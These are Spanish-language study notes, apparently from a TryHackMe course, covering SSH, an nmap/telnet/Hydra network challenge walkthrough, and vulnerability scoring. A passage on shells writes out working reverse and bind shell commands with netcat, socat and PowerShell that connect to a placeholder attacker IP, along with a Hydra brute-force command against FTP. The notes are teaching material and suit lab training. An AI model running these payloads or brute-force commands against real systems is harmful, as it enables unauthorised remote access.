SSH son las siglas de Secure SHell es un protocolo criptográfico que entre otras cosas, tiene la funcionalidad fundamental de ofrecer administración remota de una máquina mediante una via segura. 

SSH posee las siguentes características:

1. Puede confirmar la identidad del servidor remoto.
2. Los mensajes intercambiados están cifrados y solo pueden ser descifrados por el destinatario previsto
3. Ambos lados pueden detectar cualquier modificación en los mensajes.

El servicio SSH puede utilizarse mediante una autenticación a través de dos vías:

- Un nombre de usuario y una contraseña.
- Una clave privada y pública (después de que el servidor SSH esté configurado para reconocer la clave pública correspondiente).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829183158.png' | relative_url }}" text-align="center"/>
</div>

Si es la primera vez que nos conectamos a este sistema, necesitaremos confirmar la huella digital de la clave pública del servidor SSH para evitar ataques de intermediario (MITM).

Una aplicación de la *suite* de SSH es SCP (Secure Copy Protocol) que nos permite el intercambio de ficheros entre dos dispositivos de manera segura a través de SSH:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829183555.png' | relative_url }}" text-align="center"/>
</div>

Para más información [aquí](https://www.ssh.com/academy/ssh/scp).  

<br />

**Fuerza Bruta**

Los servicios de autenticación pueden ser vulnerables a un ataque de fuerza bruta si las credenciales son débiles o si el servidor no está convenientemente protegido.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829190743.png' | relative_url }}" text-align="center"/>
</div>

<br />

**CheatSheet**

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829190800.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220829190822.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 4.9. Network Challenge.

**Intro**

Use este desafío para probar su dominio de las habilidades que ha adquirido en el módulo anterior. Todas las preguntas de este desafío se pueden resolver usando solo nmap, telnet y hydra.

<br />

**Preguntas del desafío**

- *What is the highest port number being open less than 10,000?*

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220829215218.png' | relative_url }}" text-align="center"/>
	</div>

	El comando anterior escanea los 1000 puertos más comunes con la máxima velocidad (-T5) y evitando el escaneo ping previo (-Pn) , la respuesta es el 8080.

	<br />
	
- *There is an open port outside the common 1000 ports; it is above 10,000. What is it?*

	Empleamos el comando siguiente para escanear todos los puertos (-p-) que haga una comunicación exahustiva con el usuario sobre los resultados, (-vv) y que haga un escaneo TCP SYN (-sS) para intentar acortar el tiempo (notemos que como estamos utilizando el sistema Linux embebido en el navegador proporcionado por Tryhackme y somos root no hemos empleado el término sudo).
	 
	```bash
	nmap -T5 10.10.75.227 -p- -vv -sS
	```

	Obtenemos que el puerto 10021 es el puerto mencionado:
	
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220829221243.png' | relative_url }}" text-align="center"/>
	</div>

	En principio no nos dice el servicio, pero accediendo con telnet obtenemos:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220829225220.png' | relative_url }}" text-align="center"/>
	</div>

	Luego el servicio es FTP.
	
	<br />

- *How many TCP ports are open?*

	6

	<br />

- *What is the flag hidden in the HTTP server header?*

	Se nos informa que el HTTP server devuelve una cabecera que posee una flag. Para obtenerla vamos a interactuar con dicho servicio con Telnet aprovechándonos de que el servicio no está cifrado (envía información en texto claro).

	Así, en primer lugar escribimos el comando:

	```bash
	telnet 10.10.75.227 80
	```

	Cuando se inicie la sesión con el servidor HTTP escribimos la request HTTP en forma de GET con la página principal y la cabecera Host con la IP del servidor:

	```defaul
	GET / HTTP/1.1
	Host: 10.10.75.227
	```

	Obteniendo:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220829223212.png' | relative_url }}" text-align="center"/>
	</div>

	Observando que la cabecera Server que devuelve el servidor en la HTTP response contiene la flag que necesitamos. 

	<br />

- *What is the flag hidden in the SSH server header?*

	Procedemos a conectarnos con telnet para echar un vistazo a la cabecera que devuelve el servidor SSH ante un intento de conexión:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220829223410.png' | relative_url }}" text-align="center"/>
	</div>


- *We have an FTP server listening on a nonstandard port. What is the version of the FTP server?*

	Esto lo podemos hacer concretamente de dos formas, la primera forma y que llevaría más tiempo es hacer un escaneo de servicios con Nmap añadiendo un -sV al escaneo inicial:

	```bash
	nmap -sV -T5 -p- -vv 10.10.75.227
	```

	Obteniendo:
	
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220829224850.png' | relative_url }}" text-align="center"/>
	</div>

	Otra forma sería, como hemos hecho al principio, intentar acceder con telnet a dicho puerto y observar la respuesta para obtener la versión del servidor:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220829225159.png' | relative_url }}" text-align="center"/>
	</div>

	<br />
	
- *We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?*

	En este caso, se nos piden dos tareas, la primera es la de obtener unas credenciales válidas. Esto lo haremos con Hydra y la lista *rockyou.txt*:

	```bash
	hydra -l quinn -P /usr/share/wordlists/rockyou.txt 10.10.253.134 ftp -s 10021 -v -
	```

	Este comando de hydra especifica:

	- *-l*: El término candidato a nombre de usuario. 
	- *-P*: La lista de nombres candidatos a contraseña.
	- La IP y el servicio sobre el que se va a realizar las requests. 
	- *-s*: Específica el puerto en el que está escuchan la aplicación a asaltar. No es necesario si la aplicación se encuentra escuchando en un puerto predefinido.
	- *-v*: Verbose.

	Obteniendo:
	
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220829230629.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830000124.png' | relative_url }}" text-align="center"/>
	</div>

	Ahora que tenemos los dos nombres de usuario, vamos a proceder a conectarnos con Telnet sobre el servicio FTP corriendo en el puerto 10021.

	Recordamos un detalle de interés, como Telnet es un cliente simple, y no un cliente FTP preparado para lidiar con un servidor FTP, hay una serie de ajustes que han de hacerse de forma manual. Esto conlleva recordar que FTP recibe la información por un canal y envía las respuestas por un canal distinto. Este canal se puede crear de dos formas, o bien el servidor se conecta a un puerto especificado por el cliente que es lo que se denominaría el modo activo o bien, el cliente se conecta a un puerto del servidor que es lo que se denomina modo pasivo. Nosotros lo haremos del segundo modo.

	Por tanto, una vez nos conectamos con Telnet, nos logeamos con las credenciales:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830000658.png' | relative_url }}" text-align="center"/>
	</div>

	Seguidamente, para iniciar una transferencia de datos, iniciamos lo que sería el modo pasivo:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830000757.png' | relative_url }}" text-align="center"/>
	</div>

	Esto despliega una tupla de números que pueden ser agrupados en 2 conjuntos, los conjuntos de números que son de hecho los cuatro octetos de la IP del servidor (10.10.253.134) y los dos restantes son números con los que se obtiene el número del puerto mediante la siguiente operación: (119\*256 +119 = 30630). Este es el número del puerto al que debemos conectarnos con telnet para obtener devuelta el output de los comandos que introduzcamos por el canal original:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830001318.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830001334.png' | relative_url }}" text-align="center"/>
	</div>

	Así, vemos que hay un fichero que es la flag y la recuperamos de la siguiente manera, con el comando RETR:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220830001433.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

- *Browsing to http://10.10.253.134:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?*

	```bash
	nmap -sN <MACHINE-IP>
	```

	<br />

### 5. Vulnerability Research.

#### 5.1. Vulnerabilities 101.

**Intro**

Esta sección nos centraremos en los siguientes puntos:

- *Qué son las vulnerabilidades*.
- *Por qué merece la pensa conocerlas.*
- *Cómo se clasifican las vulnerabilidades*.
- *Bases de datos para descubrimiento de vulnerabilidades.*

	<br />

**Introducción to Vulnerabilities**

Dentro del campo de las vulnerabilidades es necesario tener claros los siguientes conceptos:

- *Debilidad*: Una debilidad es un fallo de configuración sobre un dispositivo. 
- *Vulnerabilidad*: Una vulnerabilidad es, técnicamente, una vulnerabilidad explotable, esto es; una debilidad de la que un atacante puede aprovecharse para tomar un cierto grado de control sobre un dipositivo. 
- *Exploit*: Mecanismo de acción utilizado para sacar partido de, o explotar, una vulnerabilidad.
- *Payload*: Componente del exploit que define el comportamiento del dispositivo tras haberse explotado la vulnerabilidad.

Existen diversos tipos de vulnerabilidad: 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220830101314.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Scoring Vulnerabilities (CVSS & VPR)**

En general, es una pérdida de tiempo y a veces una tarea imposible intentar parchear todas las vulnerabilidades que se pueden encontrar. Lo más eficiente consiste en detectar y parchear sólo las más graves y obviar las más débiles dado que con frecuencia no pueden ser empleadas como un vector de ataque. 

De aquí nace la necesidad de desarrollar un sistema de medición de la gravedad de las vulnerabilidades que un researcher puede encontrar materializado en el Common Vulnerabilitu Scoring System (CVSS) que se basa en los siguientes factores para llevar a cabo la aplicación:

- Facilidad para explotar vulnerabilidad.
- Existencia de un exploit predefinido para dicha vulnerabilidad
- Interferencia de la vulnerabilidad con la tríada CIA. 

Merece la pena saber que tenemos la siguiente [calculadora](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator) para calcular la severidad de una vulnerabilidad encontrada:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220830102555.png' | relative_url }}" text-align="center"/>
</div>

Por otra parte, tenemos el marco VPR este es un marco mucho más moderno en la gestión de vulnerabilidades. En este marco las vulnerabilidades reciben una puntuaciónrelacionada con el riesgo que una vulnerabilidad representa para la propia organización, en lugar de factores como el impacto (como con CVSS).

A diferencia de CVSS , la puntuación de VPR tiene en cuenta la relevancia de una vulnerabilidad. Por ejemplo, no se considera riesgo con respecto a una vulnerabilidad si esa vulnerabilidad no se aplica a la organización (es decir, no utiliza el software que es vulnerable). VPR también es considerablemente dinámico en su puntuación, donde el riesgo que puede presentar una vulnerabilidad puede cambiar casi a diario a medida que envejece.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220830102840.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Vulnerability Databases**

Existen bases de datos que contienen información sobre las vulnerabilidades y exploits que se han ido utilizando a lo largo de la historia. 

 1. [NVD (National Vulnerability Database)](https://nvd.nist.gov/vuln/full-listing)

2. [Exploit-DB](http://exploit-db.com/)

	<br />

El NVD es un sitio web que lista todas las vulnerabilidades publicadas ordenadas en función de su categoría. Este listado esta conformado por lo que se conoce como CVE (Common Vulnerabilities and Exposures).

Los CVEs se listan con el formato CVE-YEAR-IDNUMBER, por ejemplo CVE-2017-0144.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220830104401.png' | relative_url }}" text-align="center"/>
</div>

Por otro lado, Exploit-DB contiene exploits de softwares y aplicaciones

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220830104543.png' | relative_url }}" text-align="center"/>
</div>

Generalmente estos exploits se encuentra añadiendo el nombre de la aplicación y la versión de la misma como Apache Tomcat 9.0

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220830104728.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 4.2. Exploit Vulnerabilities.

**Intro**

En esta sala, vamos a repasar algunos medios para identificar vulnerabilidades y combinar nuestras habilidades de investigación para aprender cómo se puede abusar de ellas.

<br />

**Automated Vs. Manual Vulnerability Research**

Existen muchas herramientas que automatizan el proceso de detección de vulnerabilidades como [Nessus](https://www.tenable.com/products/nessus):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220830154031.png' | relative_url }}" text-align="center"/>
</div>

Tiene versión "comunity" y una versión pro. Las ventajas y desventajas de utilizar un escaner de vulnerabilidades automatizado son:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220830154210.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Finding Manual Exploits**

Podemos encontrar un exploit para una vulnerabilidad de una aplicación empleando sitios web públicos como Rapid7, Github, Searchsploit.

<br />

### 7. Privilege Escalation.

#### 7.1. What The Shell?

**Qué es una shell. Bind shell. Reverse shell.**

En términos muy simples, una shell es un programa que actúa a modo de interfaz entre un usuario y un entorno de línea de comandos (Comand LIne Enviroment; CLI). Es lo que empleamos para ejecutar comandos dentro de un programa o sistema operativo. 

Cuando estamos asaltando una máquina, nos conviene acceder a su entorno de comandos mediante una shell para ejecutar código arbitrario. Para ello podemos forzar al servidor remoto de dos formas distintas:

- *bind shell*: Conectándonos a un puerto del servidor y pedir la apertura de una shell.
- *reverse shell*: Hacer que el servidor genere una conexión saliente hacia nosotros y una vez abierta la sesión nos de acceso a una shell.

	<br />

**Antecedentes previos**

Antes de continuar existen una serie de herramientas y conceptos con los que debemos de estar famirializados:

- *Netcat*: Este comando es como una navaja suiza en lo referente al tema de networking. Se pueden hacer un montón de operaciones con netcat pero sus shells son a menudo muy inestables. 

- *Socat*: Esta es una evolución de Netcat, puede hacer todo lo que hace este y más cosas y mejor. Sin embargo, tiene una sintaxis más complicada y Netcat es mucho más accesible que Socat debido a que está instalado en casi cualquier dispositivo Linux. Ambos, Socat y Netcat tienen versiones para Windows. 

- *Metasploit-multihandler*: Ya hemos comentado en este mismo path que los handlers son módulos de metasploit que sirven para escuchar peticiones entrantes, esencialmente relevantes para la gestión de reverse_shell. Las opciones a ajustar en el modulo "auxiliary/multi/handler" es la IP local, el puerto local y el payload que debe coincidir con el tipo de conexión que llega desde el servidor remoto. 

- *Metasploit-msfvenom*: Herramienta del marco de Metasploit que permite crear payloads, entre los que se encuentran binid/reverse shells. 

- *Recursos en línea*: Hay muchos recursos que tienen código para abrir shells en muchos lenguajes de programación: [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), [SecLists repo](https://github.com/danielmiessler/SecLists), Kali Repositories: /usr/share/webshells

	<br />

**Tipos de shell**

Ahora vamos a profundizar más en las dos metodologías que envían shells:

- *Reverse shell*: Esto se produce cuando se fuerza a un servidor a generar una conexión hacia el cliente (máquina atacante). Esta emplea un handler o *listener* para recibir y manejar la conexión.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220728220556.png' | relative_url }}" text-align="center"/>
	</div>
	
	Las reverse shell sirven sobre todo para evitar reglas de firewalls que bloquean conexiones entrantes a la máquina. Sin embargo el contrapunto es que debes preparar tu red para manejar adecuadamente la petición entrante del servidor.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220728220812.png' | relative_url }}" text-align="center"/>
	</div>
	
	El procedimiento para abrir una reverse shell consistiría en los siguientes pasos:

	- En la máquina atacante preparamos un listener con netcat sobre un puerto:

		```bash
		sudo nc -lvnp <PORT>
		```
	 
		El comando anterior prepara a netcat como superusuario para que: "-l" escuche, "-v" verbosee lo que ocurre, "-n" no haga un DNS lookup, "-p" en un puerto local, \<PORT> el número del puerto. 

		
		
	- En el servidor o máquina víctima forzamos una conexión externa en la que llevamos el output de un comando:

		```bash
		nc <CLIENT-IP> <PORT> -e /bin/bash
		```

	De esta forma netcat ejecuta en el servidor una terminal (/bin/bash) y envía el output a lo largo de la conexión hasta la máquina cliente. Esta envía el input a introducir al servidor y este lo procesa en el programa devolviendo otra vez el output einiciando de nuevo el bucle:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220728180702.png' | relative_url }}" text-align="center"/>
	</div>

	<br />
		
- *Bind shell*: Estas se producen cuando se fuerza al servidor a escuchar una petición entrante del cliente en un puerto para abrir una shell. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220728225441.png' | relative_url }}" text-align="center"/>
	</div>

	Una bind shell se ejecuta en los siguientes pasos: 

	- En la máquina atacante se prepara un listener en un puerto en el que se va a compartir el output de un comando ejecutado en la propia máquina:

		```bash
		nc -lvnp <port> -e "cmd.exe"
		```

		De esta forma el comando anterior llama a netcat y escucha en un puerto arbitrario una conexión con la que va a compartir el output del comando cmd.exe ejecutado en la misma máquina. 
	
	- En la máquina atacante se prepara a netcat para lanzar la misma conexión sobre el puerto anterior de la máquina víctima.

		```bash
		nc <server-IP> <PORT>
		```

	De esta forma, ocurre lo mismo que ocurría en el caso de la reverse shell, ambas máquinas intercambian output e input sobre un programa que se ejecuta en el servidor y que es gestionado por el cliente.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220728183341.png' | relative_url }}" text-align="center"/>
	</div>

Hemos de darnos cuenta de que, sea cual sea el tipo de shell que abramos, primero se prepara un listener en una de las máquinas (o un handler) y seguidamente se genera una conexión con la otra máquina. 

Debemos hacer una última distinción entre shells interactivas y no-interactivas:

- *Interactive*: Un ejemplo de shells interactiva son Bash, Powershell, Zsh, etc. Estas son aquellas que permiten la interactuación sequenciada de comandos después de ejecutarlos en lugar de lanzar el comando únicamente. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220728185522.png' | relative_url }}" text-align="center"/>
	</div>

	En el ejemplo anterior se puede ver que se lanza un comando de ssh y la shell induce al usuario a interactuar con el programa que se ejecuta al lanzar el comando.

- *Non-interactive*: Son shells que no poseen tal característica, simplemente lanzan el comando pero este no tiene efecto sobre la shell con la que el usuario interactúa:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220728185826.png' | relative_url }}" text-align="center"/>
	</div>

	En el ejemplo anterior se puede observar cómo el usuario no puede interactuar con el programa SSH que ha lanzado.  

Acompañado a estos conceptos aparecen también los conceptos de *comandos interactivos*, como vim, ssh, etc y los *comandos no interactivos*, aquellos que únicamente devuelven un output y finalizan como whoami, cat, etc. 

<br />

**Netcat**

Como ya hemos mencionado anteriormente, Netcat es un comando muy importante en el campo del networking. Veámos de forma minuciosa cómo crear bind/reverse shells con netcat:

- *Reverse Shell*: Como ya hemos comentado, una reverse shell se produce forzando al servidor (máquina víctima) a realizar una conexión con un cliente (máquina atacante) en la que manda el output de una terminal y recibe el input por parte del cliente que procesa en forma de comandos dentro de la terminal.

	De esta forma, primero montamos un "listener" con Netcat en la máquina atacante:

	```bash
	nc -lvpn <PORT>
	```

	- "-l": Listen
	- "-p": port (es necesario saber que si se escoge un puerto por debajo de 1024 habrá que emplear el comando "sudo")
	- "-v": verbose
	- "-n": No hacer búsquedas DNS.
	
	Y seguidamente en la máquina víctima construimos un comando con Netcat para compartir el output de un programa en ejecución con una máquina externa:

	```bash
	nc <LOCAL-IP> <PORT> -e /bin/bash
	```

	- *\<LOCAL-IP>*: Dirección IP de la máquina atacante.
	- *\<PORT>*: Puerto al que conectarse, evidentemente debe coincidir con el puerto escogido por el atacante en el artefacto listener. 
	- *-e*: Execute.

	De esta forma, el servidor y el cliente intercambian respectivamente output e input para gestionar un programa (/bin/bash) cuya ejecución recae en el servidor.

	<br />

- *Bind shell*: En una bind shell la conexión se realiza desde el atacante (cliente) a la víctima (servidor). 

	En primer lugar se debe preparar la máquina víctima para recibir la conexión, con lo que se monta un listener con Netcat que comparta el output de un programa en ejecución:

	```bash
	nc -lvpn <PORT> -e /bin/bash
	```

	Y, de nuevo, si el puerto desciende del 1024 hay que emplear "sudo", seguidamente se lanza una conexión desde la máquina atacante:

	```bash
	nc <SERVER-IP> <PORT>
	```

	De nuevo, el puerto debe coincidir con el escogido en el anterior.

	<br />

**Netcat Shell Stabilisation**

Como ya hemos comentado, aunque Netcat es muy útil, sus shells son muy inestables por defecto; son no interactivas, CTRL+Z se lo carga todo, y suelen generar errores extraños. Esto ocurre principalmente porque las shells de netcat son procesos que corren dentro de una terminal y no una terminal genuina. 

Sin embargo, existen múltiples métodos para estabilizar una shell de Netcat, aquí veremos tres de ellas:

- *Técnica 1: Python*: 

	Esta técnica aplica únicamente sobre máquinas Linux y consiste en utilizar Python para generar una segunda shell más estable. Tiene los siguientes pasos:

	- En primer lugar, ejecutamos:

		```bash
		python -c 'import pty;pty.spawn("/bin/bash")'
		```

		Puede ser que en lugar de teclear python se necesite teclear python2/3. 

		Este comando spamea una nueva shell creada por Python, sin embargo en este punto esta no se encuentra acabada aunque puede parecer algo menos cutre. 

	- En segundo lugar:

		```bash
		export TERM=xterm
		```

		Esto nos dará acceso a comandos como clear.

	- Por último, mandamos nuestra shell a segundo plano con CTRL+Z y luego tecleamos:

		```bash
		stty raw -echo; fg
		```

		Esto hace dos cosas, elimina el echo de nuestra terminal para darnos acceso a las arrows key, CTRL+C, etc y luego trae de vuelta el proceso que contiene nuestra terminal en la máquina remota. 

		<div style="text-align:center">
			<img src="{{ 'assets/img/THM/Pasted image 20220729102923.png' | relative_url }}" text-align="center"/>
		</div>

	Por último, una vez hayamos terminado con nuestro proceso para revertir los posibles efectos hayamos podido causar en la terminal de nuestro ordenador tecleamos:

	```bash
	rese
	```

	Y tecleamos ENTER.

	<br />

- *Técnica 2: rlwrap*

	*rlwrap* es un comando que habilita el acceso a capcidades como; autocompletado con tab, historial, teclas, etc. Aún así, es necesario algún ajuste manual. 

	Para emplearlo en primer lugar es necesario instalarlo:

	```bash
	sudo apt install rlwrap
	```

	Una vez instalado, creamos un listener con el siguiente comando:

	```bash
	rlwrap nc -lvnp <port>
	```

	De esta forma, añadimos al listener de netcat las capacidades proporcionadas por rlwrap. Después envíamos la shell a segundo plano con CTRL+Z y eliminamos el echo de nuestra terminal y volvemos a traer de vuelta el proceso con:

	```bash
	stty raw -echo; fg
	```

- *Técnica 3: Socat*

	La tercera técnica de estabilizar una shell de netcat es pasar a una shell de socat. Se trata de una técnica limitada a shells de linux ya que una shell de socat para una máquina Windows no sería más estable que una shell de netcat.

	En primer lugar, debemos de transferir [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) a la máquina víctima.

	Y seguidamente ejecutamos:

	```bash
	Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
	```

Unos comandos muy útiles son:

```bash
stty rows <number>
```

<br />

```bash
stty cols <number>
```

Para cambiar el número de filas o columnas de las que se compone una terminal.

<br />

**Socat**

Ya hemos comentado que, a grandes rasgos, Socat es muy similar a Netcat en muchos aspectos, pero también es diferente en otros tantos.

La forma más fácil de pensar en Socat es como un conector entre dos puntos, todo lo que esta herramienta hace es proveer conexión entre ambos puntos. 

Veámos ahora cómo crear reverse/bind shells con Socat:

- *Reverse shells*: 

	Ya sabemos que desde una máquina debemos escuchar una conexión en un puerto mientras que desde la otra, la víctima, debemos lanzar una conexión mientras ejecutamos una terminal


	- *listener comand*:

		```bash
		socat TCP-L:<port>
		```

	- *request comand*:

		- Windows:

			```cmd
			socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
			```

		- Linux:

			```bash
			socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
			```

- *Bind shells*:

	Aquí la situación es la inversa que en el caso anterior, se lanza una conexión desde la máquina atacante y esta es recibida por la víctima que lo maneja a través de un listener con el que ejecuta a su vez una terminal.

	- *Listener comand*:

		- Windows:

			```cmd
			socat TCP-L:<PORT> EXEC:powershell.exe,pipes
			```

		- Linux:

			```bash
			socat TCP-L:<PORT> EXEC:"bash -li"
			```

- *Request Comand*:

	```defaul
	socat TCP:<TARGET-IP>:<TARGET-PORT> -
	```

	<br />

Con esto habríamos terminado la construcción de shells con Socat. Sin embargo, merece la pena echar un vistazo a una funcionalidad muy potente de esta herramienta, *una reverse shell de Linux totalmente estable*. Emplearíamos el siguiente comando a modo de listener en lugar del listener convencional que hemos visto en el apartado anterior:

```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

De nuevo, empleamos socat para conectar dos puntos, un puerto con un fichero, en concreto, estamos pasando el tty (terminal) como un fichero y seguidamente añadimos dos parámetros que juntos son el equivalente al CTRL+Z stty raw -echo;fg que hemos visto anteriormente. 

Un listener convencional de socat admite el procesamiento de cualquier conexión, ya sea python, netcat o socat. Sin embargo, para el comando especial anterior, es necesario conectarse mediante otro comando muy específico y se requiere de socat en la máquina víctima. Para ello es útil tener un [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

El comando especial para conectar se al listener es:

```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- socat TCP:\<attacker-ip>:\<attacker-port>, esta parte es sencilla, sencillamente establece una conexión con la máquina atacante.
- EXEC:"bash -li": Ejecuta un shell interactiva, junto con la que pasamos los siguientes parámetros:
	- pty: aloja una pseudoterminal en el target de la conexión.
	- stderr: se asegura de que cualquier error aparecerá reflejado en la shell. 
	- sigint: Pasa cualquier CTRL+C como comando del proceso, evitando que eso suponga la terminación de la shell.
	- setsid: crea el proceso en una nueva sesión. 
	- sane: comando para estabilizar la terminal 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220729150315.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

**Socat Encrypted Shells**

Otra de las funcionalidades de Socat consiste en la capacidad que tiene esta para crear shells cifradas, estas no pueden ser espíadas si la comunicación es interceptada a noser que tengas la clave de descifrado. 

Para crear una shell cifrada:

- Primero generamos un certificado:

	```bash
	openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
	```

	Este comando genera una llave rsa de 2048 bits con un certificado autofirmado valida hasta un año. Y juntamos tanto la llave como el certificado en un sólo fichero .pem 

	```bash
	cat shell.key shell.crt > shell.pem
	```

- Seguidamente configuramos un listener OPENSSL con nuestro certificado, esto último es obligatorio:

	```bash
	socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
	```

	Observemos que el verify=0 informa de que no hay que tratar de validar el certificado ya que este está autofirmado. 

- Desde la máquina atacada setearíamos la conexión de la siguiente forma:

	```bash
	socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
	```

Para una bind shell aplicaríamos lo mismo:

- *listener*: 
	
	```bash
	socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
	```

- *connection*: 

	```bash
	socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
	```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220729182337.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Common shell payloads**

En la siguiente sección crearemos payloads con MsfVenom, pero antes veámos cómo podemos crear otros payloads útiles mediante otras herramientas.

Ya hemos empleado por ejemplo netcat para construir una bind/reverse shell empleamos un modificador específico en el comando de la máquina víctima, ya sea a modo de listener:

```bash
nc -lvnp <PORT> -e /bin/bash
```

O a modo de solicitante de la conexión:

```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

Sin embargo, por razones de seguridad obvias, el modificador "-e" ha sido descartado en muchas de las versiones de netcat.

Aún así, seguimos pudiendo crear una reverse shell mediante el siguiente comando:

```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Desgranando el comando anterior:

- *mkfifo /tmp/f*: Genera un fichero FIFO, este es un fichero especial que envía datos de un proceso a otro de forma que el receptor lee los datos uno a uno.

- *nc -lvnp \<PORT> < /tmp/f  |  /bin/sh > /tmp/f 2>&1*: Este comando establece un "listener" por el que compartirá (con la máquina que se conecte al puerto) el output del proceso compartido por el fichero FIFO /tmp/f y seguidamente envía lo que se reciba por el puerto (el input del cliente) como input al proceso /bin/sh (shell tipo sh) que se envía sobre el fichero /tmp/f (cuyo contenido, recordamos, vuelve sobre el puerto, cerrándo así el círculo). 

- *rm /tm/f*: Borra el fichero /tm/f porque los procesos ya están conectados.

	<br />

Un comando parecido puede emplearse para crear una reverse shell:

```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Esto funcionaría para un servidor Linux, para un servidor Windows crearíamos una reverse shell con el siguiente comando:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

En el que debemos de reemplazar "\<IP>, \<PORT>" por la IP y el puerto de la máquina atacante o cliente.

Para otros tipos de reverse shells escritos en otros lenguajes: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

<br />

**Msfvenom**

Msfvenom, es una parte del marco de trabajo de Metasploit y se emplea fundamentalmente para generar payloads de bind/reverse shell en múltiples formatos. 

La sintaxis ordinaria de Msfvenom:

```bash
msfvenom -p <PAYLOAD> <OPTIONS>
```

Por ejemplo;

```bash
